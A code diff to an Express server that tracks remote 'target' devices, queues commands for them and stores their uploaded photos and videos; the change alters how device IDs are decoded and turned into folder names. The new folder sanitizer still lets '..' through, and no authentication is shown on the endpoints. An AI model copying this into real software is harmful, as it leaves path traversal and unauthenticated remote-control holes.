@@ -46,8 +46,10 @@ app.use('/storage', express.static(STORAGE_DIR, { maxAge: '7d', acceptRanges: tr
 // Configure Multer
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
-    const devId = req.headers['x-device-id'] || 'default';
-    const dir = path.join(STORAGE_DIR, devId);
+    let devId = req.headers['x-device-id'] || 'default';
+    try { devId = decodeURIComponent(devId); } catch (e) {}
+    const safeFolder = devId.replace(/[\\/:*?"<>|]/g, '-').trim();
+    const dir = path.join(STORAGE_DIR, safeFolder);
     if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
     cb(null, dir);
   },
@@ -157,15 +159,17 @@ app.get('/api/health', (req, res) => {
 
 // Device Config Endpoints (Dynamic Slots)
 app.get('/api/device/config', (req, res) => {
-  const id = (req.query.deviceId || 'DEFAULT').trim().toUpperCase();
+  let id = req.query.deviceId || 'DEFAULT';
+  try { id = decodeURIComponent(id).trim(); } catch (e) {}
   res.json({ deviceId: id, config: getDeviceConfig(id) });
 });
 
 app.post('/api/device/config', (req, res) => {
-  const { deviceId, config } = req.body;
+  let { deviceId, config } = req.body;
   if (!deviceId || !config) return res.status(400).json({ error: 'deviceId and config required' });
 
-  const id = deviceId.trim().toUpperCase();
+  try { deviceId = decodeURIComponent(deviceId).trim(); } catch (e) {}
+  const id = deviceId;
   deviceConfigs[id] = config;
   // Always update global fleet default so every new phone inherits it!
   deviceConfigs['DEFAULT'] = config;
@@ -184,10 +188,11 @@ app.get('/api/devices', (req, res) => {
 
 // Target device heartbeat & registration
 app.post('/api/target/heartbeat', (req, res) => {
-  const { deviceId, name, model, stats } = req.body;
+  let { deviceId, name, model, stats } = req.body;
   if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
 
-  const id = deviceId.trim().toUpperCase();
+  try { deviceId = decodeURIComponent(deviceId).trim(); } catch (e) {}
+  const id = deviceId;
   const existing = devices.get(id) || {};
 
   devices.set(id, {
@@ -211,7 +216,7 @@ app.post('/api/target/heartbeat', (req, res) => {
 
 // Legacy check endpoint
 app.post('/api/pair/check', (req, res) => {
-  const code = (req.body.code || '').trim().toUpperCase();
+  const code = (req.body.code || '').trim();
   if (req.body.device || req.body.stats) {
     const id = code || 'DEFAULT-DEV';
     devices.set(id, {
@@ -230,7 +235,8 @@ app.post('/api/pair/check', (req, res) => {
 
 // Commands
 app.get('/api/commands', (req, res) => {
-  const id = (req.query.deviceId || req.query.code || '').trim().toUpperCase();
+  let id = req.query.deviceId || req.query.code || '';
+  try { id = decodeURIComponent(id).trim(); } catch (e) {}
   if (!id) return res.status(400).json({ error: 'deviceId required' });
 
   if (devices.has(id)) {
@@ -248,7 +254,8 @@ app.get('/api/commands', (req, res) => {
 });
 
 app.post('/api/commands', (req, res) => {
-  const id = (req.body.deviceId || req.body.code || '').trim().toUpperCase();
+  let id = req.body.deviceId || req.body.code || '';
+  try { id = decodeURIComponent(id).trim(); } catch (e) {}
   const command = req.body.command;
   if (!id || !command) return res.status(400).json({ error: 'deviceId and command required' });
 
@@ -273,9 +280,11 @@ app.post('/api/target/progress', (req, res) => {
 
 // Upload
 app.post('/api/upload', upload.single('media'), (req, res) => {
-  const deviceId = (req.headers['x-device-id'] || req.headers['x-pairing-code'] || 'DEFAULT').trim().toUpperCase();
+  let deviceId = req.headers['x-device-id'] || req.headers['x-pairing-code'] || 'DEFAULT';
+  try { deviceId = decodeURIComponent(deviceId).trim(); } catch (e) {}
   if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
 
+  const safeFolder = deviceId.replace(/[\\/:*?"<>|]/g, '-').trim();
   const mediaEntry = {
     id: path.basename(req.file.filename, path.extname(req.file.filename)),
     deviceId,
@@ -284,7 +293,7 @@ app.post('/api/upload', upload.single('media'), (req, res) => {
     mimeType: req.file.mimetype,
     size: req.file.size,
     type: req.file.mimetype.includes('video') ? 'video' : 'photo',
-    url: `/storage/${deviceId}/${req.file.filename}`,
+    url: `/storage/${encodeURIComponent(safeFolder)}/${req.file.filename}`,
     createdAt: new Date().toISOString()
   };
 
@@ -297,7 +306,8 @@ app.post('/api/upload', upload.single('media'), (req, res) => {
 
 // List media
 app.get('/api/media', (req, res) => {
-  const deviceId = (req.headers['x-device-id'] || req.query.deviceId || req.query.code || '').trim().toUpperCase();
+  let deviceId = req.headers['x-device-id'] || req.query.deviceId || req.query.code || '';
+  try { deviceId = decodeURIComponent(deviceId).trim(); } catch (e) {}
   let items = db.media;
   if (deviceId && deviceId !== 'ALL') {
     items = items.filter(m => m.deviceId === deviceId);
